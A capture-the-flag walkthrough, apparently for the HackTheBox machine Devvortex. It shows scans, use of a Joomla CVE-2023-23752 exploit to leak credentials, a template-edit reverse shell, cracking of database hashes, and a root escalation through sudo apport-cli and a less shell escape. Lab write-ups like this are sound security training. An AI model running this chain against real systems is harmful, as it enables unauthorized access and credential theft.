---
description: https://app.hackthebox.com/machines/Devvortex
---

# Devvortex

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

## Port scan

```bash

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack
|_http-title: DevVortex
| http-methods:
|_  Supported Methods: GET HEAD
```

## Subdomain scan

```bash
└─➜ ffuf -u http://devvortex.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.devvortex.htb' -ac                                       [0]

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 8233ms]
    * FUZZ: dev

:: Progress: [4989/4989] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:48] :: Errors: 0 ::
```

* Let's add this to our `/etc/hosts` file

## Directory scan (on subdomain)

```bash
└─➜ ffuf -u http://dev.devvortex.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -ac -e .php                                                                     [0]

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 358ms]
    * FUZZ: administrator

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 470ms]
    * FUZZ: api

<-SNIPPED->
:: Progress: [40952/40952] :: Job [1/1] :: 61 req/sec :: Duration: [0:10:38] :: Errors: 0 ::
```

## Web Exploitation (www-data)

* if you visit `http://dev.devvortex.htb/administrator/` you'll find joomla CMS running. ![image](https://user-images.githubusercontent.com/56447720/285627598-c695aac9-abce-4d0a-a219-d9593f36171b.png)
* I found this beautiful exploit that does our work.
* https://github.com/AlissoftCodes/CVE-2023-23752

### Creds

```bash
└─➜ python3 juid.py -a http://dev.devvortex.htb/                                                                           [0]

[USERS]
Name: lewis
ID: 649
Username: lewis
Email: lewis@devvortex.htb
Register date: 2023-09-25 16:44:24
Group name: Super Users
Able to send e-mail: Yes
Name: logan paul
ID: 650
Username: logan
Email: logan@devvortex.htb
Register date: 2023-09-26 19:15:42
Group name: Registered
Able to send e-mail: No

[CONFIGS]
Database type: mysqli
Host: localhost
User: lewis
Password: <--SNIPPED-->
Database: joomla
Database prefix: sd4fg_
Encryption: 0
```

* Running that script will get us creds, we can now login in to the app
* After login under `system` you edit a template to get revshell
* http://dev.devvortex.htb/administrator/index.php?option=com\_templates\&view=templates\&client\_id=0
* Since it's a `.php` file we can use pentestmonkey php revshell
* I edited `error.php` with the revshell & got the `www-data`
* https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![image](https://user-images.githubusercontent.com/56447720/285629532-19b913d7-8efb-4ce4-bf96-7fca18949ab4.png)

## User shell

* I searched almost every file for user shell, none were good enough.
* Mysql login with the creds we found earlier worked

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

```

* Lets use joomla one

```bash
Database changed
mysql> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
<-SNIPPED->
| sd4fg_users                   |
<-SNIPPED->
+-------------------------------+
71 rows in set (0.00 sec)

mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-26 03:50:43 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$I              <-SNIPPED->               Niy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

mysql>
```

* Voila we got logan's hash
* Let's crack it with John

```bash
┌─[ ~/stuff/htb/DevVortex] [ 10.10.16.9]
└─➜ john --wordlist=/usr/share/wordlists/rockyou.txt logan.hash                                                                                                                          [0]
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<SNIPPED>    (?)
1g 0:00:00:03 DONE (2023-11-26 09:35) 0.3205g/s 461.5p/s 461.5c/s 461.5C/s winston..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

* DONEEEEEEE, now ssh & grab the user.txt

## Root Shell

* sudo -l

```bash
Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

* Hmmm, after googling, I found this
* https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb
* https://bugs.launchpad.net/ubuntu/+source/apport/+bug/2016023
* Lets create our own file, generate report for it & grab the root shell :)

### Exploitation

```bash
logan@devvortex:/tmp$ echo 'test' > pwn.sh
logan@devvortex:/tmp$ chmod +x pwn.sh
logan@devvortex:/tmp$ sudo apport-cli -c pwn.sh less

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
..............

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
<HERE YOU GET "less" command output type "!sh">
# id
uid=0(root) gid=0(root) groups=0(root)
```

* pwned ^^ \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning
